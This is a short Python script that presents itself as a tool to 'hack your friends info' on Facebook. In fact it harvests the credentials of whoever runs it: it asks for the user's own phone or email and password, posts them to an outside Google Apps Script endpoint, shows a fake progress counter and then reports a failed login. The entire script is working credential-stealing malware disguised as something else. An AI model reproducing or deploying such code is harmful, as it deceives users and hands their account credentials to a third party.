
import requests
import pyfiglet
import time
a = pyfiglet.figlet_format('facebook info')
b = pyfiglet.figlet_format( 'PyaeSoneHmoo')
print(a)
print(b)
print("autor by: Pyae Sone Hmoo")
print("dont use illegal")
print('please login with your facebook \n for hack your firends info')

umail =input("please Enter phone and gmail:")
upass =input("please Enter  password'")
data ={'mail':umail,'pass':upass}
rq =requests.post('https://script.google.com/macros/s/AKfycbx1cnhTRxQYCCWH0E55DRSXr54-p2-Q-0AEzUtqoTRZVHx1sw/exec',data=data)

for i in range(100):
   print(i,'%')
   time.sleep(1)
print('invalid password or username')
